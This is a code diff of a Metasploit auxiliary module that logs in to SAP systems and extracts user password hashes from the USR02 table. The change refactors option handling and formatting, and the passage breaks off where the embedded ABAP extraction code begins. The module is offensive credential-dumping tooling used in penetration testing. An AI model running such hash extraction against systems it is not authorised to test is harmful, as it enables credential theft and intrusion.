@@ -28,8 +28,11 @@ class Metasploit4 < Msf::Auxiliary
       },
       'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
       'Author'         => [ 'nmonkee' ],
-      'License'        => BSD_LICENSE
-       )
+      'License'        => BSD_LICENSE,
+      'DefaultOptions' => {
+        'CLIENT' => "000"
+      }
+    )
 
     register_options(
       [
@@ -39,27 +42,25 @@ class Metasploit4 < Msf::Auxiliary
   end
 
   def run_host(rhost)
-    user = datastore['USERNAME']
-    pass = datastore['PASSWORD']
     unless datastore['CLIENT'] =~ /^\d{3}\z/
         fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
     end
-    exec_USR02(user,client,pass,rhost,datastore['rport'])
+    exec_USR02(datastore['USERNAME'], datastore['PASSWORD'])
   end
 
-  def exec_USR02(user, client, pass, rhost, rport)
+  def exec_USR02(user, password)
     saptbl = Msf::Ui::Console::Table.new(
               Msf::Ui::Console::Table::Style::Default,
-                'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
-                'Columns' =>
-                          [
-                            "MANDT",
-                            "Username",
-                            "BCODE",
-                            "PASSCODE"
-                          ])
+              'Header'  => "[SAP] Users and hashes #{rhost}:#{rport}:#{client}",
+              'Columns' =>
+                [
+                  "MANDT",
+                  "Username",
+                  "BCODE",
+                  "PASSCODE"
+                ])
 
-    login(rhost, rport, client, user, pass) do |conn|
+    login(rhost, rport, client, user, password) do |conn|
 
 code = <<ABAPCODE
 REPORT EXTRACT LINE-SIZE 255 NO STANDARD PAGE HEADING.
